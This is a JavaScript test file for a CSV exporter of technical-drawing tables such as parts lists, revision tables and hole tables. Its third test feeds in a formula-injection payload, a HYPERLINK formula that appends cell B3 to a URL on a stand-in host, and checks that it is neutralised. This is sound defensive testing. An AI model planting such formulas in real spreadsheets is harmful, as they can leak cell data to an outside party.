import test from "node:test";
import assert from "node:assert/strict";
import { tableCsv, csvName, hasCsv } from "../js/csv.js";

const bom = { type: "bom", rows: [{ poz: "1", name: "Arbore", qty: "1", mat: "C45; călit", obs: 'zis "mare"' }, { poz: "2", name: "Bucșă", qty: "2", mat: "CuSn12", obs: "" }] };

test("parts list: titles in the drawing language, ; with a decimal comma, quotes where needed", () => {
  const csv = tableCsv(bom, { sep: ",", dlang: "ro" });
  assert.ok(csv.startsWith("\uFEFF"));
  const lines = csv.slice(1).split("\r\n");
  assert.equal(lines[0], "Poz.;Denumire;Buc.;Material;Observații");
  assert.equal(lines[1], '1;Arbore;1;"C45; călit";"zis ""mare"""');
  assert.equal(lines[2], "2;Bucșă;2;CuSn12;");
  assert.equal(lines[3], "");
  const en = tableCsv(bom, { sep: ".", dlang: "en" }).slice(1).split("\r\n");
  assert.equal(en[0], "Item,Description,Qty,Material,Remarks");
  assert.equal(en[1], '1,Arbore,1,C45; călit,"zis ""mare"""');
});

test("revision and hole tables; other annotations have none", () => {
  const rev = tableCsv({ type: "revtab", rows: [{ rev: "1", desc: "Ø20 → Ø22", date: "26.11.2026", name: "OM" }] }, { sep: "," });
  assert.equal(rev.slice(1).split("\r\n")[1], "1;Ø20 → Ø22;26.11.2026;OM");
  const holes = tableCsv({ type: "holes", rows: [{ tag: "A1", x: "10,5", y: "20", d: "Ø8" }] }, { sep: "," });
  assert.equal(holes.slice(1).split("\r\n").slice(0, 2).join("|"), "Gaură;X;Y;Ø|A1;10,5;20;Ø8");
  assert.equal(tableCsv({ type: "dim" }, {}), "");
  assert.ok(hasCsv(bom) && !hasCsv({ type: "text" }));
  assert.equal(csvName("piesa 1.pdf", bom), "piesa 1_componente.csv");
  assert.equal(csvName("a/b.dwg", { type: "holes" }), "a_b_gauri.csv");
});

test("text that Excel would run as a formula gets an apostrophe; plain numbers stay numbers", () => {
  const rows = [
    { poz: "1", name: '=HYPERLINK("http://x.invalid/?"&B3,"Detalii")', qty: "-2", mat: "@SUM(A1)", obs: "+0,1/-0,05" },
    { poz: "2", name: "-Arbore", qty: "+5", mat: "-0,02", obs: "Ra 1,6" },
  ];
  const lines = tableCsv({ type: "bom", rows }, { sep: "," }).slice(1).split("\r\n");
  assert.equal(lines[1], `1;"'=HYPERLINK(""http://x.invalid/?""&B3,""Detalii"")";-2;'@SUM(A1);'+0,1/-0,05`);
  assert.equal(lines[2], "2;'-Arbore;+5;-0,02;Ra 1,6");
});
